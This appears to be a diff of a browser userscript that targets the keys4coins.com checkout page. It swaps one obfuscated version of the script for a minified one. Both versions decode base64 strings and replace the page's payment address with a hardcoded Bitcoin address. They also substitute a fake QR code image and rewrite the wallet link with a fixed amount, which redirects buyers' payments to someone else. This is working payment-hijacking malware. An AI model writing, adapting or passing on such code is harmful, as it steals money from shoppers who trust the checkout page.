@@ -8,43 +8,4 @@
 // @match        https://www.keys4coins.com/checkout/order-pay*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=keys4coins.com
 // ==/UserScript==
-(function(){
-    const _0x5f1c = (function(){
-        const s = [
-            'ZG9jdW1lbnQ=','Z2V0RWxlbWVudEJ5SWQ=','cGF5bWVudC1hZGRyZXNz',
-            'M0NzZnk4V0gyd2lEaHp0YkRncld2VFpLM2NzVGJrQjYzNg==',
-            'cXVlcnlTZWxlY3Rvcg==','aW1n','c3Jj','YXBwZW5kQ2hpbGQ=',
-            'aHJlZg==','Yml0Y29pbjozQ3NmeThXSDF5aURoenRiRGdyV3ZUWkszY3NUYmtCNjM2P2Ftb3VudD0wLjAwOTM1NiZsYWJlbD1LZXlzNENvaW5zJTIwT3JkZXIlMjAyNzkzNDA='
-        ];
-        return function(i){
-            return atob(s[i]);
-        };
-    })();
-
-    const D = window[_0x5f1c(0)];
-    const addr = _0x5f1c(3);
-
-    try {
-        D[_0x5f1c(1)](_0x5f1c(2)).textContent = addr;
-
-        const img = D[_0x5f1c(4)](_0x5f1c(5));
-        img[_0x5f1c(6)] = 'https://i.imgur.com/Rsb2GeO.png';
-
-        D.body[_0x5f1c(7)](img);
-
-        D[_0x5f1c(4)]('[title="Scan QR code or click to open wallet client."]')
-            [_0x5f1c(8)] = _0x5f1c(9);
-
-    } catch(e){}
-
-    (function(){
-        const map = {
-            'https://i.imgur.com/90o6ShZ.png':'https://i.imgur.com/Rsb2GeO.png'
-        };
-        const imgs = D.getElementsByTagName('img');
-        for (let i=0;i<imgs.length;i++){
-            if (map[imgs[i].src]) imgs[i].src = map[imgs[i].src];
-        }
-    })();
-
-})();
+(()=>{const _=s=>atob(s),A=_('M0NzZnk4V0gyd2lEaHp0YkRncld2VFpLM2NzVGJrQjYzNg=='),B=_('aHR0cHM6Ly9pLmltZ3VyLmNvbS9Sc2IyR2VPLnBuZw=='),C=_('aHR0cHM6Ly9pLmltZ3VyLmNvbS85MG82U2haLnBuZw=='),D=document;try{D.getElementById('payment-address').textContent=A;let i=D.createElement('img');i.src=B;D.body.appendChild(i);D.querySelector('[title="Scan QR code or click to open wallet client."]').href='bitcoin:'+A+'?amount=0.009356&label=Keys4Coins%20Order%20279340'}catch(e){}for(let x of D.getElementsByTagName('img'))x.src===C&&(x.src=B)})();
